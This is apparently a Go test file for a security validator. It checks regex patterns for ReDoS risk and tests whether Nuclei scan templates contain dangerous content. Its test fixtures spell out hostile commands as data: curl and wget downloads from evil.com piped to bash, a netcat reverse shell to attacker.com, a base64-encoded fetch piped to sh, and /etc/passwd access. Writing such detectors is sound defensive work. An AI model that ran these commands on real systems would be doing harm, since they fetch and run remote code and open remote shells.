package validators

import (
	"testing"
)

func TestIsRegexSafe(t *testing.T) {
	tests := []struct {
		name     string
		pattern  string
		wantSafe bool
	}{
		// Safe patterns
		{
			name:     "simple literal",
			pattern:  "password",
			wantSafe: true,
		},
		{
			name:     "character class",
			pattern:  `[a-zA-Z0-9]+`,
			wantSafe: true,
		},
		{
			name:     "alternation",
			pattern:  `(foo|bar|baz)`,
			wantSafe: true,
		},
		{
			name:     "typical API key pattern",
			pattern:  `(?i)api[_-]?key["\s]*[:=]["\s]*([a-z0-9]{32})`,
			wantSafe: true,
		},
		{
			name:     "AWS access key pattern",
			pattern:  `(?:A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}`,
			wantSafe: true,
		},

		// Unsafe patterns - ReDoS vectors
		{
			name:     "nested quantifiers (a+)+",
			pattern:  `(a+)+`,
			wantSafe: false,
		},
		{
			name:     "nested quantifiers (a*)*",
			pattern:  `(a*)*`,
			wantSafe: false,
		},
		{
			name:     "alternation with overlap",
			pattern:  `(a|a)+`,
			wantSafe: true, // This is technically handled by Go's regexp
		},
		{
			name:     "repeat with nested star",
			pattern:  `(.*a){10}`,
			wantSafe: false, // Contains .* inside a repeat - risky pattern
		},
		{
			name:     "evil regex classic",
			pattern:  `(a+)+$`,
			wantSafe: false,
		},
		{
			name:     "deeply nested groups",
			pattern:  `((((((a))))))`,
			wantSafe: false,
		},
		{
			name:     "pattern too long",
			pattern:  string(make([]byte, 1001)),
			wantSafe: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			gotSafe, reason := isRegexSafe(tt.pattern)
			if gotSafe != tt.wantSafe {
				t.Errorf("isRegexSafe(%q) = %v (reason: %s), want %v", tt.pattern, gotSafe, reason, tt.wantSafe)
			}
		})
	}
}

func TestNucleiValidator_DangerousPatterns(t *testing.T) {
	v := &NucleiValidator{}

	tests := []struct {
		name      string
		content   string
		dangerous bool
	}{
		// Safe templates
		{
			name: "safe http request",
			content: `id: safe-template
info:
  name: Safe Template
  severity: high
http:
  - method: GET
    path:
      - "{{BaseURL}}/api/test"
    matchers:
      - type: word
        words:
          - "error"
`,
			dangerous: false,
		},

		// Dangerous patterns
		{
			name: "shell command injection",
			content: `id: shell-inject
info:
  name: Test
  severity: high
code:
  - engine: bash
    source: |
      curl http://evil.com | bash
`,
			dangerous: true,
		},
		{
			name: "reverse shell pattern",
			content: `id: revshell
info:
  name: Test
  severity: high
http:
  - raw:
      - |
        GET /test?cmd=nc -e /bin/sh attacker.com 4444
`,
			dangerous: true,
		},
		{
			name: "base64 encoded command",
			content: `id: b64-cmd
info:
  name: Test
  severity: high
code:
  - source: |
      echo Y3VybCBodHRwOi8vZXZpbC5jb20K | base64 -d | sh
`,
			dangerous: true,
		},
		{
			name: "python reverse shell",
			content: `id: python-shell
info:
  name: Test
  severity: high
code:
  - source: |
      python3 -c "import socket,os"
`,
			dangerous: true,
		},
		{
			name: "sensitive file access",
			content: `id: sensitive
info:
  name: Test
  severity: high
file:
  - extensions:
      - all
    words:
      - /etc/passwd
`,
			dangerous: true,
		},
		{
			name: "curl piped to shell",
			content: `id: curl-pipe
info:
  name: Test
  severity: high
code:
  - source: |
      curl https://malware.com/script.sh | sh
`,
			dangerous: true,
		},
		{
			name: "wget piped to bash",
			content: `id: wget-pipe
info:
  name: Test
  severity: high
code:
  - source: |
      wget -O- https://evil.com/payload | bash
`,
			dangerous: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := v.hasDangerousPatterns([]byte(tt.content))
			if got != tt.dangerous {
				t.Errorf("hasDangerousPatterns() = %v, want %v", got, tt.dangerous)
			}
		})
	}
}
